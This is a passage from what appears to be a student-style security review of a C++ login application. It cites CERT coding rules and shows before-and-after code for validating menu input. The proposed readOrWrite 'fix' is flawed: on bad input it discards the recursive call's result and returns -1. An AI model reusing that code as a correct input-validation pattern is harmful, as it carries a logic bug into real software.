index<32; index++) {\r\n        sprintf(buffer + index*2, \"%02X\", (unsigned char)hashBuffer[index]);\r\n    }\r\n> ```\r\n> \r\n>    Line 329-331,here  sprintf() function makes no guarantees regarding the length of the generated string.\r\n\r\n> * MSC24-C. Do not use deprecated or obsolescent functions\r\n>\r\n    strcpy() was used in many places of the application, it is recommended to use strcpy_s() instead\r\n\r\n> * EXP05-CPP. Do not use C-style casts\r\n>\r\n    Throughout the application, both `(c style)` and `<c++ style>` casts were used.  It is recommended that you use `<c++ style>` casts.\r\n    \r\n    \r\n###Recommended Fixes to Vulnerabilities\r\n> ###Character Input Fix\r\n>#####Modify loginOrRegister() and readOrWrite()       \r\n>```bash\r\nstring loginOrRegister() {\r\n        // Prompt user for “login” or “register”\r\n        int isLogin;\r\n        cout << \"Please enter 0 for register or 1 for login: \";\r\n        cin >> isLogin;\r\n        if (isLogin) {\r\n                if(login()){\r\n                        cout<< \"You logged in successfully!\" <<endl;\r\n                }\r\n                else{\r\n                        cout << \"Wrong info!\" <<endl;\r\n                        loginOrRegister();\r\n                }\r\n        }\r\n        else{\r\n                username = registerUser();\r\n        }\r\n        return username;\r\n}\r\n>\r\nint readOrWrite() {\r\n        //Return 1 if they want to read, 0 if they want to write;\r\n        int rorW;\r\n        cout << \"Please enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: \";\r\n        cin >> rorW;\r\n        return rorW;\r\n}\r\n>``` \r\n> #####updated loginOrRegister()        \r\n>```bash\r\nstring loginOrRegister() {\r\n        // Prompt user for “login” or “register”\r\n        string isLogin;\r\n        cout << \"Please enter 0 for register or 1 for login: \";\r\n        cin >> isLogin;\r\n        if (!isLogin.compare(\"1\")) {\r\n                if(login()){\r\n                        cout<< \"You logged in successfully!\" <<endl;\r\n                }\r\n                else{\r\n                        cout << \"Wrong info!\" <<endl;\r\n                        loginOrRegister();\r\n                }\r\n        }\r\n        else if(!isLogin.compare(\"0\")){\r\n                username = registerUser();\r\n        }\r\n        else {\r\n          cin.clear();\r\n          cout << \"\\n\";\r\n          loginOrRegister();\r\n        }\r\n        return username;\r\n}\r\n> \r\nint readOrWrite() {\r\n        //Return 1 if they want to read, 0 if they want to write;\r\n        string choice;\r\n        cout << \"Please enter 1 if you want to read, enter 0 if you want to write, or 2 to quit: \";\r\n        cin >> choice;\r\n        if (!choice.compare(\"0\")) {\r\n          return 0;\r\n        } else if (!choice.compare(\"1\")){\r\n          return 1;\r\n        } else if (!choice.compare(\"2\")) {\r\n          return 2;\r\n        } else {\r\n          cin.clear();\r\n          cout << \"\\n\";\r\n          readOrWrite();\r\n        }\r\n        return -1;\r\n}\r\n>```\r\n>###String Vulnerability Fix\r\n> \r\n>#####Simply replace all `printf()` commands with `cout <<`\r\n>###SQL Injection Fix\r\n> \r\n>#####Use prepared statements or bind parameters\r\n",
  "note": "Don't delete this file! It's used internally to help with page regeneration."
}